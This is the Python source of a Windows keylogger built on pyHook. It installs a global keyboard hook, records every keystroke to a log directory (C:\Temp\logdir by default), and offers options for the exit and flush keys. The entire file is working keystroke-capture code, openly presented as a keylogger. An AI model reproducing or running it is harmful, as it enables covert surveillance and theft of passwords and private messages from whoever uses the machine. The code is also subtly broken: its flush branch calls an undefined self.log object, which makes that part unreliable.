import pyHook
import time
import pythoncom
import sys
from optparse import OptionParser
import traceback
from logwriter import LogWriter

class KeyLogger:
    ''' Captures all keystrokes, and logs them to a text file
    '''
    def __init__(self): 
        
        self.ParseOptions()
        
        self.hm = pyHook.HookManager()
    
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.options.hookKeyboard == True:
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        self.lw = LogWriter(self.options.dirname, self.options.debug) 
        
        pythoncom.PumpMessages()
            

    def OnKeyboardEvent(self, event):
        '''This function actually writes the stuff to the log, subject to parsing.
        '''
        '''
        self.log.write('MessageName: ' + str(event.MessageName))
        self.log.write('Message: ' + str(event.Message))
        self.log.write('Time: ' + str(event.Time))
        self.log.write('Window: ' + str(event.Window))
        self.log.write('WindowName: ' + str(event.WindowName))
        self.log.write('Ascii: ' + str(event.Ascii) + ' ' + chr(event.Ascii))
        self.log.write('Key: ' + str(event.Key))
        self.log.write('KeyID: ' + str(event.KeyID))
        self.log.write('ScanCode: ' + str(event.ScanCode))
        self.log.write('Extended: ' + str(event.Extended))
        self.log.write('Injected: ' + str(event.Injected))
        self.log.write('Alt: ' + str(event.Alt))
        self.log.write('Transition: ' + str(event.Transition))
        self.log.write('---\n')
        '''
        
        self.lw.WriteToLogFile(event, self.options)
        
        if event.Key == self.options.flushKey:
            self.log.flush()
        
        if event.Key == self.options.exitKey:
            sys.exit()
            
        return True
    
    def ParseOptions(self):
        #usage = "usage: %prog [options] arg"
        parser = OptionParser(version="%prog version 0.3")
        parser.add_option("-f", "--file", action="store", dest="dirname", help="write log data to DIRNAME [default: %default]")
        parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input [default: %default]")
        parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected (for Notepad compatibility) [default: %default]")
        parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string [default: %default]")
        parser.add_option("-e", "--parseescape", action="store_true", dest="parseEscape", help="translate escape chacarter into printable string [default: %default]")

        parser.add_option("-x", "--exitkey", action="store", dest="exitKey", help="specify the key to press to exit keylogger [default: %default]")
        parser.add_option("-l", "--flushkey", action="store", dest="flushKey", help="specify the key to press to flush write buffer to file [default: %default]")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        
        parser.set_defaults(dirname=r"C:\Temp\logdir",
                            hookKeyboard=True,
                            addLineFeed=False,
                            parseBackspace=False,
                            parseEscape=False,
                            exitKey='F12',
                            flushKey='F11',
                            debug=False)

        (self.options, args) = parser.parse_args()
            
if __name__ == '__main__':
    kl = KeyLogger()
    
    #if you want to change keylogger behavior from defaults, run it with commandline options. try '-h' for list of options.
    